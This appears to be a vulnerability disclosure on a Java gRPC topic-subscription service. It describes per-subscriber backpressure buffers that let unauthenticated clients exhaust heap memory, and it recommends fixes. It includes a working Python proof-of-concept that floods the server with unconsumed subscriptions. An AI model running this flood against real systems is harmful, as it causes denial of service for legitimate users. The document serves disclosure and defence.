### Title
Unbounded Per-Subscriber Memory Amplification via `onBackpressureBuffer` in `SharedTopicListener.listen()`

### Summary
Each call to `SharedTopicListener.listen()` wraps the shared upstream Flux with its own independent `onBackpressureBuffer` operator, meaning memory consumption scales linearly with the number of active subscriptions regardless of upstream sharing. Because there is no global subscription limit and no authentication on the gRPC endpoint, an unprivileged attacker can open arbitrarily many connections (each allowing 5 concurrent calls) and exhaust JVM heap memory, causing an OOM-based denial of service.

### Finding Description

**Exact code path:**

`SharedTopicListener.listen()` ( [1](#0-0) ) applies `.onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)` on the result of `getSharedListener(filter)` for every invocation:

```java
public Flux<TopicMessage> listen(TopicMessageFilter filter) {
    return getSharedListener(filter)
            .doOnSubscribe(s -> log.info("Subscribing: {}", filter))
            .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
            .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
}
```

`RedisTopicListener.getSharedListener()` ( [2](#0-1) ) correctly shares the upstream Redis Flux via `computeIfAbsent` and `.share()`:

```java
protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
    Topic topic = getTopic(filter);
    return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
}
```

The `.share()` at the end of `subscribe()` ( [3](#0-2) ) makes the Redis subscription itself shared (one upstream for all subscribers). However, in Reactor, `onBackpressureBuffer` is a **per-subscriber operator** — each call to `listen()` instantiates a new, independent buffer. The upstream sharing does not eliminate the per-subscriber buffer allocation.

**Root cause:** The failed assumption is that sharing the upstream Flux also shares the downstream buffering. It does not. Every `listen()` call creates a new operator chain with its own buffer of up to `maxBufferSize` entries (default 16 384, configurable up to 65 536 per `@Max(65536)` in `ListenerProperties`). [4](#0-3) 

**Why existing checks fail:**

The only subscription-rate control is `maxConcurrentCallsPerConnection = 5` ( [5](#0-4) ), set at the Netty server level in `GrpcConfiguration`. [6](#0-5)  This is a **per-connection** limit, not a global one. There is no limit on the number of connections, no IP-based rate limiting, and no authentication on `ConsensusController.subscribeTopic()`. [7](#0-6) 

`BufferOverflowStrategy.ERROR` terminates a slow subscriber once its buffer is full, but the buffer must first fill to `maxBufferSize` before termination — meaning the memory is consumed during the fill phase. An attacker who opens new subscriptions faster than old ones are terminated sustains the pressure continuously.

### Impact Explanation
On a high-traffic topic, each subscription's buffer can hold up to 16 384 `TopicMessage` objects (default) before overflow. A `TopicMessage` carries byte arrays for `message`, `runningHash`, `initialTransactionId`, and several primitive fields — realistically 1–10 KB per object. With N connections × 5 calls each:

- 200 connections → 1 000 subscriptions → up to ~16 GB heap at 1 KB/message
- 1 000 connections → 5 000 subscriptions → up to ~80 GB heap at 1 KB/message

This causes JVM OOM and crashes the gRPC service, constituting a complete denial of service for all legitimate subscribers.

### Likelihood Explanation
The attack requires no credentials, no special protocol knowledge beyond standard gRPC, and no on-chain funds. A single attacker machine can open thousands of TCP connections to the gRPC port. The attack is repeatable and automatable with any gRPC client library. The only friction is network-level firewall rules, which are not enforced by the application itself.

### Recommendation
1. **Global subscription cap:** Track total active subscriptions in `TopicMessageServiceImpl` (the `subscriberCount` AtomicLong already exists) and reject new `subscribeTopic` calls above a configurable threshold.
2. **Per-IP / per-connection subscription limit:** Enforce a maximum number of concurrent subscriptions per remote address at the gRPC interceptor level.
3. **Move buffering upstream:** Apply `onBackpressureBuffer` once on the shared Flux inside `getSharedListener()` (before `.share()`), so the buffer is shared rather than replicated per subscriber. Downstream subscribers would then use a small fixed prefetch only.
4. **Authentication/rate limiting:** Require authentication or apply token-bucket rate limiting on `subscribeTopic` to prevent unauthenticated bulk subscription.

### Proof of Concept
```python
# Requires: grpcio, grpcio-tools, hedera proto stubs
import grpc, threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc as cs
from com.hederahashgraph.api.proto.java import consensus_service_pb2 as cp
from com.hederahashgraph.api.proto.java import basic_types_pb2 as bt

TARGET = "mirror-node-grpc:5600"
TOPIC_NUM = 1234          # any valid topic
CONNECTIONS = 500         # 500 connections × 5 calls = 2500 subscriptions

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = cs.ConsensusServiceStub(channel)
    query = cp.ConsensusTopicQuery(
        topicID=bt.TopicID(topicNum=TOPIC_NUM)
    )
    streams = []
    for _ in range(5):    # maxConcurrentCallsPerConnection = 5
        s = stub.subscribeTopic(query)
        streams.append(s)
    # Do NOT consume responses — let buffers fill
    import time; time.sleep(300)

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# Result: gRPC server JVM heap exhausted → OOM crash
```

```java
    private Flux<TopicMessage> subscribe(Topic topic) {
        Duration interval = listenerProperties.getInterval();

        return container
                .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
                .map(Message::getMessage)
                .doOnCancel(() -> unsubscribe(topic))
                .doOnComplete(() -> unsubscribe(topic))
                .doOnError(t -> log.error("Error listening for messages", t))
                .doOnSubscribe(s -> log.info("Creating shared subscription to {}", topic))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
                .share();
```
